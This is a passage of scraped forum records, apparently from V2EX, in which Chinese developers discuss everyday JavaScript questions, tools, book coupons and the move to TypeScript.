{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/24751393\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/24751393</a></div>"], "reply": "目前尚无回", "tittle": "main vs browser vs jsnext:main vs module", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>` 如何给 tempArray 赋值然后返回，现在总是返回一个空数组</p>\n<pre><code>        let tempArray = []; \n        news.toArray((err,items)=&gt;{\n            items.map(x=&gt;{\n                tempArray.push({\n                    \"title\":x.title,\n                    \"content\":x.content,\n                    \"createTime\":x.createTime\n                })\n            })\n        })\n        return tempArray\n</code></pre>\n</div></div>"], "reply": "9", "tittle": "请教一个赋值的问题", "comment": ["news 是什么， toArray() 是什么库的方法，签名是什么。", " \r", "news 就是从 mongodb 里查出来的记录\r", "collection.find().toArray((err,items)=>{})\r", "这样的", "你这个回调函数还没执行呢就返回了 array ，然后你取值的时候可能回调还没执行，所以不会有值的。", "虽然代码槽点很多，但语法上确实看不出什么问题来。\r", "你打一个 log 看看 items 的长度吧，应该是逻辑上的问题。", "根据第一项参数是 err 基本可以判定是异步的函数，在函数没有执行的时候就把空数组给返回了", "自己解决了\r", "用 Promise.all\r", "结贴了", " 求指正，槽点都有哪些=。=|||", " \r", "map 本身就要返回一个新数组，可以直接用来构建新数组。\r", "如果想要遍历数组，也该用 forEach 。", " 是呀，一语中的！楼主先多理解理解 js 中的 callback 和 event loop 是怎么回事。"]},
{"content": "", "reply": "18", "tittle": "用 Weinre 还落后么？有没有更好的移动端调试工具推荐", "comment": ["chrome", "新版 chrome 都可以直接连到 webview 上了", "尽量使用简单的框架 /组件", " 怎么连接？", "微信官方出的调试工具不好吗，连 android 手机用什么 x5 内核", " 安卓 5 以上就可以了", "微信官方的 0.7 版本的调试工具很好用", "内部也是 Weinre", "\r", "这东西还是不错的", "Ghostlab2 要花钱。", " nice", "Firefox 也自带", " \r", "移动端前端开发调试\r", "\r", "看一下这篇文章", "Firefox 50.1 里面的查看元素界面有个响应式设计模式", " 为什么要抢我台词。：）", "我觉得如果能通过 USB 插线调试的时候，肯定比 weinre 好。\r", "但不能插线的时候还是要用 weinre"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>起因：因为图片服务器为了统计信息，所以做了 UA 验证，而 WebAdmin 的一些图片是存储在该图片服务器上的，于是 403 了。<br><br>\n思路：现在我想到的最直观的思路就是使用 JS 更改登陆 WebAdmin 的浏览器的 UA 以完成验证并顺利取到图片资源。<br><br>\n尝试：今天搜索了一整天，把 google 上能搜到的都看了，其中一半都在 StackOverflow 上，但是得出的解决方案就一种，且无效果，下面是“解决方案”：<br></p>\n<pre><code>Object.navigator.\\_\\_defineGetter\\_\\_('userAgent', '自定义 UA 字串');//旧写法\n</code></pre>\n<pre><code>Object.prototype.setProperty(navigator, 'userAgent': function() {return '自定义 UA 字串';});//新写法\n</code></pre>\n<p>写法大概是这样，我不太记得了，还有个写法差不多的方式就不列出来了。<br><br>\n这些方案无一例外，在 JS 中修改成功，然后执行</p>\n<pre><code>console.log(window.navigator.userAgent);\n</code></pre>\n<p>也是正常的，但是发送到服务器的 UA 却还是未修改过的原 UA ，但是使用 Chrome 、 Firefox 自带的改 UA 的方法，均有效。所以我最后猜测：\n<b>浏览器发送给服务器请求中的 UA 和通过 JS 取到的 UA 是两个不同的实例</b><br><br>\n那么问题来了：如何通过 JS 修改 UA 呢？望大神们不吝赐教~~</p>\n</div></div>"], "reply": "48", "tittle": "请教 JS 如何修改 UserAgent？", "comment": ["js 还能改 User Agent ?", "呃…你 js 修改只是改了当前页面下的环境。然而你执行完 js 后，浏览器发起请求你的图片浏览器还是会保持他本身的 ua …简单来说… js 改的只会在 js 获取的时候被改，其他地方然并卵", "自己实现一下 http request 就可以构造自定义头了吧？", "我听过用 Browser 改 UA...\r", "JavaScript 还能控制 UA...", "NO WAY!", "浏览器发的没办法， fetch 或者 XHR 可以拦截", "> 浏览器发送给服务器请求中的 UA 和通过 JS 取到的 UA 是两个不同的实例\r", "\r", "http 的 User-Agent 头确实可以与 JS 的 `navigator.userAgent` 不同，比如 Firefox 就可以修改成这样，但一般是一样的。\r", "而你现在修改的 JS 环境里的 navigator.userAgent ，这是 JS 环境里的一个值，与 http 请求头 User-Agent 不是一个东西来的。要修改 http 请求头，如果是通过浏览器的请求，一般需要使用浏览器的扩展来实现；如果是通过 JS 请求的， xhr 和  fetch 都可以直接修改（但也不是通过 navigator.userAgent 来修改的， navigator.userAgent 是给 js 来用的）\r", "\r", "最后提供一个比较 hack 的做法：可以通过 xhr 或 fetch 来请求图片数据，然后转成 base64 显示出来（不过这可能会涉及到跨域问题）。\r", "\r", "PS ：你的图片服务器不是公开的吗？为什么会屏蔽浏览器的 UA ？", "无法，搞代理吧", "ajax 请求即可", " 果然是这样，那请问有无思路提供？", " HTML 静态无法实现， JS 如何实现 HTTP Request 的构造？ JS 新人~~", "ua 是浏览器加的吧", "除非你找到了浏览器的漏洞， user-context 的 JS 不可能修改 user-agent\r", " ajax  也不可以修改 user-agent", "js 的执行环境仅仅是当前页面， so …", " 查用 Ajax 能不能构造请求头， xmlhttprequest 的实例，我忘了具体怎么搞……应该是可以的", "你可以通过扩展方式对相应的请求截获并修改 UA 。", "UA 的意义不就是获取客户端类型么，如果网页能随便改似乎没意义了？", "或者你可以试试 flash ……", "用 requests 模块多好，不折腾", "明显是 XY 问题…你应该从根本上解决这个问题，而不是非要用这种投机取巧的办法", "楼上说的是对的。", " 我没有什么前段经验，但是如果能够用 socket 的话怎么样都行啊", "这样的浏览器插件应该随手可以搜到吧（如果你是在浏览器里运行 js ），比如： ", " （火狐）， Chrome 我猜也有。亲测有效。", "不能改   head 里有几个关键字段  js 无权限修改的  比如 date 浏览器会报错      如果你是 nodejs 的话另当别论", "额……又看了一遍，你已经试过了插件……", "形象点说，又是一个持有工商储蓄卡就想修改工行卡余额的……", " 多谢告知。", " 图片服务器好像是为了统计自家 APP 的相关信息，所以对 UA 做了特殊判断（是否包含特定字串），而现在就是想要对（需要用到该图片服务器的资源的） WebAdmin 后台管理页面在请求该图片服务器的资源时的请求头中的 UA 做特殊修改（追加上图片服务器需要的特定字串）。\r", "另，请教“如果是通过浏览器的请求，一般需要使用浏览器的扩展来实现”，和“如果是通过 JS 请求的， xhr 和 fetch 都可以直接修改”分别是什么意思，难道是指前者是由浏览器发出 GET 请求的，后者是由 JS 发出请求的？还不是一回事儿？", " 愿闻其详。\r", "另，「こころ」は何ですか？", " 多谢，我搜索一下", " browser extension ？", " Flash 一窍不通。愿闻其详。", " XY 问题？", " 茅塞顿开 QAQ", " 其实主要是因为后台管理页面是可以随处登陆的，用户也不会是同一个人，如果每次登陆都修改一次登录时用的浏览器的 UA ，那就有点儿...", "js 运行是浏览器解析吧，这时候浏览器已经获取请求头了呀还咋改", "让你的 js 在浏览器插件方式运行就可以改了, 具体参考浏览器插件的 api", " 测试了一下，确实改不了，会报错： Refused to set unsafe header \"User-Agent\"  \r", "PS ココロ 源自一首歌", " 多谢。", " 好 我搜一下。", " 代理、 chrome 的开发模式中可以改 ua", " 其实主要是因为后台管理页面是可以随处登陆的，用户也不会是同一个人，如果每次登陆都修改一次登录时用的浏览器的 UA ，那就有点儿...", "nginx 反代设置 header ， 一行搞定，如果服务端有用 nginx 的话。\r", "图片反盗链都是检测 Referer 头部吧，第一次听说检测 UA 的", " 其实我并不确定检测 UA 的目的是什么，所以猜测是为了统计自家 APP 使用情况。服务器确实是用的 Nginx ，问题是服务器我肯定动不了，不然我直接关闭验证多省事儿。不过还是感谢出谋划策了。", "用 node 写可以吧？然后给前端做代理，比如本来需要访问 server1.com/1.jpg ，现在改成 server2.com/1.jpg ，在 server2 后端 pipe 一下请求到 server1 ，在请求里面设置 UA\r", "\r", " 这样的话，这些图片直接存在 WebAdmin 的服务器上更直接。不过也是一个思路。", " 那你就检查 referer||UA 不行啊？非要单独判断 UA 吗？", " 是的"]},
{"content": ["<div class=\"topic_content\">感觉引入类型系统还是很爽快的，虽然很多人反对 js 做这种事。改用 typescript 太麻烦了，这个好像值得一试。有在项目中已经引用的同学吗？体验如何？</div>"], "reply": "7", "tittle": "有在项目中用 facebook 的 flow.js 的吗？", "comment": ["试过，不喜欢。。。当你用 ES6 + Flow 的时候，为什么不用 Typescript 呢？ 只要开发一个 Angular 2 程序， Typescript 很快就习惯 了，而且 Typescript 官方网站有 Angular2, React 使用教程。\r", "\r", "用 Flow 一个好处是你的 Facebook 的开发工具（基于 Atom ）可以得到类型检测支持， 和 强类型语言一样。其它编辑器应该不会认的。", " \r", "\r", "> 当你用 ES6 + Flow 的时候，为什么不用 Typescript 呢\r", "\r", "这什么逻辑， Babel = TypeScript 吗\r", "\r", "> 只要开发一个 Angular 2 程序， Typescript 很快就习惯 了\r", "\r", "谁要开发 Angualr 2 程序啊\r", "\r", "> 用 Flow 一个好处是你的 Facebook 的开发工具（基于 Atom ）可以得到类型检测支持， 和 强类型语言一样。其它编辑器应该不会认的。\r", "\r", "等于没说。。\r", "\r", "---\r", "\r", "P.S. 楼主是 flowtype 不是 flow.js", " 前排围观轮子哥！\r", "\r", " 的意思估计是 tsc 可以把 es6 编译为 es5", "有在项目简单应用了下，可惜动态的情况无法检查，异步，事件这种。\r", "\r", "ts 还是算了，侵入性太强", " 呵呵。。。", " 当你用 Flow 把 ES 6 代码类型强制加上后，不如直接用 TypeScript 简单， IDE/Editor 支持好得多，目前 VS Code 和 Atom 支持完美。 Flow 现在只有 Facebook 自己的 Nuclide （ Atom 插件， Windows 用户功能缺失）支持。\r", "\r", "在现有的 ES 6 Babel （+Webpack ）环境中，换到 Typescript 只是加个 TS Loader 而已。现在前端开发 Babel + Webpack 不是标配了吗？", " babel 可不只是 6to5"]},
{"content": ["<div class=\"topic_content\">都是不错的书，需要买正版的可以用这几个优惠码，非常优惠，赞图灵～\r<br>因为一个优惠码只能用一次， so ，麻烦用了的跟帖说一声以免重复。\r<br>\r<br>KZUYZRGDB\r<br>有效期从 2017-01-09 开始，至 2017-02-09 结束，减价 24 元 。 本优惠码对《 jQuery 基础教程（第 4 版）（国内第一本 jQuery 权威教程，一版再版，累计重印 14 次，不可错过的实战类经典技术著作！）》图书有效。\r<br>\r<br>TMNFLEBDL\r<br>有效期从 2017-01-09 开始，至 2017-02-09 结束，减价 17 元 。 本优惠码对《 JavaScript 编程全解》图书有效。\r<br>\r<br>YHTXOUUDE\r<br>有效期从 2017-01-09 开始，至 2017-02-09 结束，减价 32 元 。 本优惠码对《你不知道的 JavaScript （中卷）》图书有效。\r<br>\r<br>RFRBYMWZB\r<br>有效期从 2017-01-09 开始，至 2017-02-09 结束，减价 24 元 。 本优惠码对《 JavaScript Web 应用开发》图书有效。\r<br>\r<br>CTTBQQPNW\r<br>有效期从 2017-01-09 开始，至 2017-02-09 结束，减价 20 元 。 本优惠码对《你不知道的 JavaScript （上卷）》图书有效。\r<br>\r<br>JavaScript编程全解\r<br><a target=\"_blank\" href=\"http://www.ituring.com.cn/book/1140\" rel=\"nofollow\">http://www.ituring.com.cn/book/1140</a>\r<br>你不知道的JavaScript（上卷）\r<br><a target=\"_blank\" href=\"http://www.ituring.com.cn/book/1488\" rel=\"nofollow\">http://www.ituring.com.cn/book/1488</a>\r<br>你不知道的JavaScript（中卷）\r<br><a target=\"_blank\" href=\"http://www.ituring.com.cn/book/1563\" rel=\"nofollow\">http://www.ituring.com.cn/book/1563</a>\r<br>JavaScript Web应用开发\r<br><a target=\"_blank\" href=\"http://www.ituring.com.cn/book/1636\" rel=\"nofollow\">http://www.ituring.com.cn/book/1636</a>\r<br>jQuery 基础教程（第 4 版）\r<br><a target=\"_blank\" href=\"http://www.ituring.com.cn/book/1169\" rel=\"nofollow\">http://www.ituring.com.cn/book/1169</a></div>", "<div class=\"topic_content\">优惠码和账户绑定了的，才知道……很抱歉各位～</div>"], "reply": "12", "tittle": "送几个图灵社区电子书的优惠码， javascript*4， jQuery*1", "comment": ["前排支持～好像都买过了", "本来想买本《 JavaScript Web 应用开发》的 然而优惠码已经无效\r", "全部试了一下 全部无效", "怎么全部无效啊 ?", "来参与书单计划吧 ", " 点错了，只是想问下，这个感觉，不会长久？", " 不是吧…我发在这里就没管了，去看看…", " 手机登录图灵社区看了下优惠码根本就没有状态，看不出来是有效还是无效，晕，难道是和账户绑定的？", " 这头像好眼熟啊", " 会作为长期计划持续下去的，放心", " 你自己买过那本电子书了吗? 没买的话自己试用一下就好了.\r", "\r", "图灵买实体书后, 用刮刮卡记录后, 电子书优惠券似乎是绑定的", " 我去试试吧，就是因为我有了实体书不需要电子版才想着送给需要的朋友，如果是绑定的那就没办法了", " 试过了，我自己的账户是可用的，看来图灵确实不允许赠送。这样真的是不好意思～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 学了快两年，想学学 JavaScript ，不知道大家有没有什么坑和经验可以指教指教~</p>\n</div></div>"], "reply": "45", "tittle": "想学习 JavaScript，有什么经验和坑吗？", "comment": ["  \r", "参考此贴", "不带这么吓人的，看完《 javascript 高级程序设计》吧", "整个前端都是个大坑 你学了 1 年明年全给你推翻了", "  整理的一些 js 的视频教程和书籍，看是否对你有用", "你先决定是否写分号，", " 必须不带分号 XD", " \r", " \r", "早期写 asp 不准写分号\r", "后来写 php 必须写分号\r", "后来写 js 随便你写不写：）", "不写分号！", " 其实 ASP 用 JScript 也是随便写不写的……", " 写 js 还是用 node.js 吧 虽然那时候没有…… ASP 默认当然是 VBS 了……但是那时候也有懂 JS 的直接用 JScript ，不过也有可能不少优势（没学过） 最显而易见的问题就是时区…… 真是羡慕嫉妒恨啊。", "之前听我司某前端说  js 要写分号 不然压缩的时候会出现乱七八槽 不可预知的错误诶… (Gopher 表示写 Js 的时候经常还是会忘 233 )  最近在看 vue  结合着 gopher-vue 看感觉倒好理解了 233", "楼上那些说分号问题的。。。。\r", "\r", "你们项目不包含 .eslintrc 之类的文件吗", "统一 airbnb eslint 或 standard 规范", "就 js 这门语言本身，看 mozilla 的介绍就够了。\r", "\r", "\r", "\r", "\r", "\r", "学的过程你也许会有类似 python 的即时感，没错它们的新版特性应该有互相借鉴。上述过程坑的，是 js 的一些黑暗属性，那是类似 c++ 坑的历史遗留问题，尽量按照最佳规范避开或者写最新标准的代码就好了。\r", "\r", "坑无穷多的其实是前端开发。学会 js 本身没啥用，主流的用途当然是配合前端开发。当然了纯后端 nodejs 环境也不是不可以，那就成了和 py web 开发没啥区别了。\r", "\r", "接下来学的前端开发路径可以是：知道 nodejs 和浏览器 js 的差别和应用场景，了解前端的各种概念比如说 dom 和 ajax 和 promise 等（其实就是各种 api 和设计模式），然后就是搭建前端开发全家桶比如说 node+babel+webpack （一堆很复杂的东西，类似 c++ 环境的编译器 makefile 等等，没错写最新版 js 需要编译器把它编译成旧版的），然后是选择一些前端框架来学比如说 react vue angular （强烈不推荐 angular 作为入门， react vue 的上手曲线比较平缓）。\r", "\r", "既然前端开发，陆陆续续肯定会顺手把 html css 学了。 css 也是一个大坑，只兼容新浏览器的话可以考虑全用 flexbox 实行布局。不想纠结这方面的话请用 bootstrap 框架。\r", "\r", "个人吐槽一下，前端开发与其说繁荣不如说混乱。现在像是三国混战，也许过几年就好了。入坑需谨慎啊。\r", "╮(╯▽╰)╭", "\r", "\r", "and\r", " \r", "你让我写。我会个皮毛。你让我改！我连自己都不相信我竟然会那么多！", "我还是习惯写分号的", "先只精通 js 和 css ，其他什么 typesctipt coffee less sass 什么的都别管", "别上来就学框架，不然你会哭的。前端框架和工具一年一变，先打好坚实的基础，再用框架。", " 你说什么？后面的名词都没听过 /笑 cry\r", "\r", " 我连基础都不会~", "你不像已经学过几年语言的程序员，重要的是开始用，不要把学语言当成备单词。", " 我本来就不是程序猿", "前端:\r", "语言基础打好就可以学框架了, jQuery 不算什么框架, 不过是高兼容性的类库. 原生的 querySelector 及 DOM 操作要会点\r", "基础方面, 你要知道字符串, 数组, 及数字的各种操作, 要知道什么情况下,reduce 的速度比其它遍历方式快.\r", "instance 继承判断与原型链要会, 难的是读别人的插件, 更难的是做插件.\r", "js 的设计模式可以看看", "遇到 coffeeScript 编译出来的的真是无语, 很多东西用各种技术进行编译,打包, 有时 github 上的插件要求打包环境. 单单安装环境就烦死你", "js 还是挺好学的，框架那是另一回事。", "发现楼上居然有说分号的，你们学一门语言，最基本的规范都不遵守？写个分号这么好的习惯又不花力气还能省很多麻烦，这都要省掉我是不能理解的。。。", "\r", "之前在 sf 上看到的，相互学习", "  不见得写分号是好习惯啊…", " 额，那还真不知道有啥坏处，请教一下？", "你不是玩 Python 吗？为啥又要学前端...\r", "感觉还不如找门主力语言再往下深入学。\r", "Python 现在好玩的东西很多，比如深度学习😂", "  知乎上有讨论该不该写分号， ", " 看了一下，这个还是假设： 1 ，人会忘记写分号， 2 ，人会不遵守 js 的规则在每个语句后都写分号，但是如果一开始就养成了好习惯，我觉得完全不存在这些问题。我只能说正确的写分号在多数情况下都有利于代码的理解，当然分行也基本能做到这一定，代码压缩借助好的工具肯定也能解决，说到底还是看个人习惯吧。 js 有明确的规则什么时候能省略分号，什么时候不能，只要遵循规则就行，非要说我都不写分号，全靠工具来加，我觉得这实际上是不理解基本的语句规则，那哪天没有工具，只是需要在控制台测试一段代码，都不知道哪些分号不能省那不是只能抓瞎了……", "总结一下就是 js 的分号本来就是可选的，而且有明确的规则，至于你写不写，本来就是你的自由，只要别搞错了就行，而且个人认为这个规则算是很简单的了。", "自己作死，学什么 JS", "看标题的时候我第一想法是：\r", "想去学学 Python 吧，看了贴才知道...", "根据框架再决定写不写分号咯，比如 vuejs 我就不写", "先学原生 JS ，在学 jQuery ，然后再框架；这样不会被坑；\r", "如果上来就学框架，会发现所有框架都会坑你！", "1. 别用 == 用 ===\r", "2. 别用 for...in 用 for...of\r", "3. \"use strict\";", " 我也不是，但这多年没少写了，工作需要，所以给你的建议就是一定要用起来，不用考虑那么多，现在是坑，可能以后就不是了，对别人是经验到你这可能是呵呵。", " 吓尿了😂", "把 js 看成一门语言，不要看成前端。", "js 学好不容易，现在更新太快了", "我覺得最好還是打好基礎，從犀牛書看到高性能 JavaScript ，以及數據結構及其部分算法。切記不要浮", "请问今时今日要打语言基础的话，看 <You Dont Know JavaScript >会不会比犀牛书更好呢？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在找全兼容的网页视频播放插件， videojs 感觉不错， IE7/8/9/10/11 和 Edge/Firefox/Opera/Chrome/Safria 都可以播放。但是在视频节点操作上被 IE7/8 卡住了，我的需求是点击按钮切换视频，在其他浏览器都可以实现，但 IE7/8 不行。切换代码很简单：</p>\n<pre><code>var obj = videojs('video1');\nobj.pause();\nobj.src({type:'video/mp4', src:\"videos/a.mp4\"});\nobj.currentTime(0);\nobj.load();\nobj.play();</code></pre>\n<p>我是按顺序导入以下两个 js 文件的：</p>\n&lt;script src=\"js/videojs/video.js\"&gt;&lt;/script&gt;<br>\n&lt;script src=\"js/videojs/videojs-ie8.js\"&gt;&lt;/script&gt;\n<p>在 IE7/8 会报错：</p>\n<blockquote>\n<p>SCRIPT438: 对象不支持“ isArray ”属性或方法</p>\n</blockquote>\n<p>搞了很久都不行，请问有搞过这个的吗？请指点。\n还有能切换、暂停视频和浏览器全兼容的同类型插件吗？</p>\n</div></div>"], "reply": "7", "tittle": "谁搞过 videojs 的 IE 兼容问题，在 IE7/8 如何用 Javascript 切换视频源？", "comment": ["当然不行了，他们都不支持 html5. 你去换个支持 flash 播放的插件去吧。\r", "\r", "\r", "\" In video.js 5.0, we started the process of deprecating the last holdout in our supported browsers: the dreaded Internet Explorer 8. If you ’ re saying to yourself “ Wha?! You still support IE8??”, I share your shock and horror.\"", "心疼 po 主，站点还要弄 IE 适配。", " 我看他们还继续更新 videojs-ie8.js ，以为还支持一段时间呢，毕竟视频能播，不能切换而已，就差一点啦", " 都是泪", "把 isArray 定义补上在看看啊，还有缺定义的话就把 es5 的 polyfill 全补上再看。", "为啥不用 jplayer", "\r", "\r", "still actively developing~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>func.bind(a).call(b) 问题出在哪儿 是因为 bind 不立即执行么 求指教</p>\n<p>截图在这 <a href=\"http://7xsw2u.com1.z0.glb.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-09%20%E4%B8%8B%E5%8D%885.50.54.png\" rel=\"nofollow\">http://7xsw2u.com1.z0.glb.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-09%20%E4%B8%8B%E5%8D%885.50.54.png</a></p>\n</div></div>"], "reply": "14", "tittle": "关于 bind 和 call 的疑问", "comment": ["五迷？", "截图里 a 已经是结果了呀，你还 call 啥？另外你这么用 bind 根本无效呀，何必呢……", "bind 传一个 context 进去, 返回一个改变了 context 的新函数\r", "call/apply 传 context 和一个或多个参数进去, 然后执行这个函数", " （举手）这有个五迷！", " 是啊 刚把自己的头像恢复过来就被认出来\r", "\r", "  \r", "\r", "  我傻了哈哈 a 本来就返回结果了 为什么这里函数 this 是指向 obj 的呢", "func.bind 之后 this 已被确定，再次调用 call 或者 apply 妄图改变绑定的 this 都会无效", " 蟹蟹 我又重新认识了", "看下这个 polyfill 就很清晰了：\r", " v 站五迷群： 5143163 ，来群一起玩啊", " v 站五迷群： 5143163 ，来群一起玩啊，都是码农五迷", " 已加！", " 啊，我说错了， bind 是有用的。 f.bind(a).call(b) 这里 call 能改变 bind 返回的函数的 this 为 b ，但 bind 里面包的函数 f 的 this 已经指定为 a 了，不能改了。", " 我原意就是想问 this 指向 应该还指向 a", "推荐你把这本书的中间几章啃一遍 ", " 能看英文就看英文吧 恩"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>详细介绍: <a href=\"http://zhuatang.com/templateJS.jsp\" rel=\"nofollow\">http://zhuatang.com/templateJS.jsp</a></p>\n<p>GitHub 地址： <a href=\"https://github.com/zhsoft88/templateJS\" rel=\"nofollow\">https://github.com/zhsoft88/templateJS</a>\n包含源码， ObjC/Swift 的测试代码。</p>\n</div></div>"], "reply": "11", "tittle": "超轻量 javascript 模版引擎 templateJS 1.0 发布啦！(只有 500 字节)", "comment": ["这个语法让人想到 ejs ", "用浏览器点开看了一下代码，扔了几个 pr …", "代码写的可以啊，要是能加上 data 和 view 的绑定就更好了", "「抄」了个 371 字节的版本。\r", "\r", "闲得无聊重写了一遍，然后又 pr 上去了，完全移除了逐字符搜索， uglified 是 463 bytes ，用正则应该更短，但是这样就彻底破坏源程序逻辑了…", " 说真的你这个正则真是…\r", "[\\s\\S]等价于.\r", "[]里的除了\\以外不需要转义…", " 啊，[]里需要转义的还有-和[]本身，但没有歧义的情况下也不需要转…", " \r", "\r", "javascript 里就算在多行模式下 . 也不匹配 line terminators\r", "\r", "不过也可以用 [^]", " 试了一下还真是，没怎么用过 m 模式，受教了", "说真的如果一个 JavaScript 模板引擎里面还用 for 「 (var i = 0; ...)」 循环来遍历的话我感觉和手动拼 HTML 并没有什么差别了。", "类似的还有 ectjs"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>打算每周写一篇文章，这是本周的文章，发出来大家一起分享一下。原文地址：</p>\n<p><a href=\"http://www.jianshu.com/p/f035cb4b9a40\" rel=\"nofollow\">http://www.jianshu.com/p/f035cb4b9a40</a></p>\n<p>上周的文章：《什么是 MVVM 模式？》</p>\n<p>原文地址： <a href=\"http://www.jianshu.com/p/a898ef83f38c\" rel=\"nofollow\">http://www.jianshu.com/p/a898ef83f38c</a></p>\n<p>论坛地址： <a href=\"https://www.v2ex.com/t/332758#reply3\" rel=\"nofollow\">https://www.v2ex.com/t/332758#reply3</a></p>\n<hr>\n<h1>做 JavaScript 开发的同学，快来加入 TypeScript 大家庭吧！</h1>\n<p>转入 TypeScript 做开发有大半年了，想来分享一些自己的心得体会。</p>\n<p>第一次学习并使用 JavaScript 大概是在 07 年，当时为了做一个 Web 自动化的项目，踏上了我的 JavaScript 之旅，最终以《 Web 应用自动化生成工具的设计与实现》（大概是这么个名字）这篇论文来结束了我的研究生生涯。</p>\n<p>那时候还没有全栈开发这一说，不过想想自己似乎 10 年前就开始了这种工作状态。我过往的技术经历比较复杂，在我们那个年代最主要的软件还是以 Windows C/S 架构为主，搞过 Socket 通信、写过 ARP 病毒，研究过 MFC 的 Thunk 技术；后来慢慢又接触了 C#、 Java ，还深深记得刚从 DAO 转入到 Hibernate 时的那种懵逼。</p>\n<p>那时候觉得学什么都特别的开心，计算机专业学的还是“科学”与“技术”，也没有“互联网行业”这一说，我们这一行都还叫做“软件行业”，培训班都还在教你如何做网页。《晓松奇谈》里面有一集讲歌坛那个“白衣飘飘的年代”，我觉得 2000 年-2010 年这 10 年就似乎是我的那个“白衣飘飘的年代”。那时候技术还比较神秘，大家都以研习 Windows Undocumented API 为荣，我记得我还打印了一本 Intel x86 汇编的小册子随身携带；那时候以为掌握了 Hook 就掌控了操作系统，以为会用 Ethereal 就监听了全世界。</p>\n<p>我记得那是一个午后，我的导师花了两个小时给我讲解 JavaScript 的基础语法。这应该算是我从业多年来，最快速最密集学习的一门语言了。我还依稀记得那“ 22 条军规”：</p>\n<ul>\n<li>变量类型有 numer 、 string 、 bool......</li>\n<li>定义变量用 var</li>\n<li>if &amp; for 跟 C 语言 一样</li>\n<li>function 跟 C 语言 一样</li>\n<li>class 的语法是...</li>\n<li>访问成员变量必须带上 this 指针</li>\n<li>闭包是......</li>\n<li>......</li>\n</ul>\n<p>就这么从头到尾讲完了这 10 来条语法，然后导师对我说：“恩，差不多就这些了，你先开工吧，明天我来检查......”。 WTF ！！！就像驾校司机刚告诉了你如何启动汽车、如何操作刹车、油门，就对你说：“差不多了，明天你开车去趟......”。好吧，一个“老司机”就这么上路了，反正写啥都是在写 BUG 。</p>\n<p>作为那个年代的三大神兽语言 C++、 C#、 Java ，我基本上都同时在写。不过他们都是 Class First 语言，以面向对象为核心，类是一等公民，定义一个类也是各种繁文缛节（相对于动态语言来说）。所以我在第一次见到 JavaScript 这种动态语言时，我的内心是震撼的，犹如从三维世界进入到四维世界的那种“宏大”，那种难以描述的“自由”。</p>\n<blockquote>\n<p>为了防止有人喷我，特地做一下说明，不然一堆屁话就来了：\n1 、回头来看，我如此的震撼并不是因为 JavaScript 语言本身的精妙，而是因为动态语言相对于静态语言的自由程度；\n2 、我之前的技术经历主要是在 C++，并未接触过动态语言；\n3 、 JavaScript 语言也有很多糟粕，不算“优秀”的语言，但并不影响我对它的喜爱；\n4 、 Ruby 也是我喜爱的语言之一。</p>\n</blockquote>\n<p>一个 JavaScript 的类（准确的讲是指模拟 C++ 里同一概念的类），它身上的属性、方法可以被动态的添加、删除、修改；一个函数可以作为变量到处传递，还有 lambda 表达式，可以直接写在函数的参数里面作为 Callback ，这在当时的 C++/Java 里面简直不可想象。</p>\n<p>在 C++ 里面，底层的很多网络库都是 C 语言实现的，所以一个 C++ 的成员函数是不能直接直接做为 Callback 函数传给底层 lib 的，而是要传递一个类的 static 方法，然后再想办法从这个 static 方法 跳回到成员方法。 MFC 的 Thunk 技术就是在解决这一问题。直至今天在 Java 里面要实现一个 Callback 还需要写一大堆 Interface 、 Listener 什么的，真的是非常繁琐（ Java 8 已经支持 lambda 表达式了，通过引入编译工具可以在 Android 开发里面使用，强烈推荐）。</p>\n<p>而最最重要的一点就是 JavaScript 的世界观其实就是一张 Hash 表，至少我的理解是这样的。这就是一个 key-value 的世界，所有类、对象都是 Hash 表，数组也是。 key 就是对象属性， value 可以是普通变量，也可以是函数，也可以是一个对象，等等。只是恰好如果 value 是一个变量，我们习惯称它为成员属性，如果 value 是一个函数，我们习惯称它为成员函数。而 Prototype 原型链也只不过是 Hash 表的一种存储结构，原型链查找也就是一种 Hash 查找算法而已。</p>\n<p>10 年前，用了一个下午爱上了 JavaScript ，而 10 年后又遇上了 TypeScript 。这 10 年中大部分时候还是在用 C++ 和 Java 来工作，所以 JavaScript 的一些痛苦，感受并没有像 “职业”开发者那样深，不过也还是遭遇到了不少的坑。变量不用定义就能用，偶尔代码写错一个字就成了一个新变量，为此却要付出大量的 debug 时间；早期调试也相对比较痛苦，这几年工具越来越完善了，不过做为一个从 Visual Studio 入门的开发者，看别的平台的调试方法总觉得不够傻瓜。</p>\n<p>遇上 TypeScript 虽然没有 10 年前遇上 JavaScript 那样轰轰烈烈，但是也算喜爱有加。遇上 Javascript （遇上动态语言）我觉得解决的是精神生活的问题，而遇上 TypeScript 算是解决了物质生活的问题。以前开发 JavaScript 时的部分脏活累活都可以被消灭了。</p>\n<h2>这里才刚刚开始</h2>\n<p>先简单科普一下 TypeScript ：</p>\n<blockquote>\n<p>TypeScript 是由微软开发的一种基于 JavaScript 语法的语言，且已经支持了 ES6 、 ES7 语法。你可以理解它为 JavaScript 的超集，也可以理解为 JavaScript 的增强版。 TypeScript 代码不能直接运行，需要通过编译器编译成 JavaScript 文件才能使用，所以依然可以在浏览器环境或者 node 环境下无缝使用。</p>\n</blockquote>\n<p>好了，跑题了这么久，我终于要说为什么要从 JavaScript 转到 TypeScript 了，它到底解决了什么问题。</p>\n<h2>编译期类型检查</h2>\n<p>最最重要的能力就是：</p>\n<ul>\n<li>编译期类型检查</li>\n<li>编译期类型检查</li>\n<li>编译期类型检查</li>\n</ul>\n<p>重要的事情要说三遍。有了编译期类型检查再也不用担心变量写错名字、错误的类型赋值、写掉对象属性这些基本问题了。虽然无时无刻都需要书写类型信息，但是我相信这是值得的。部分 JavaScript 开发者可能会觉得有点繁琐，其实相信从静态语言转到 JavaScript 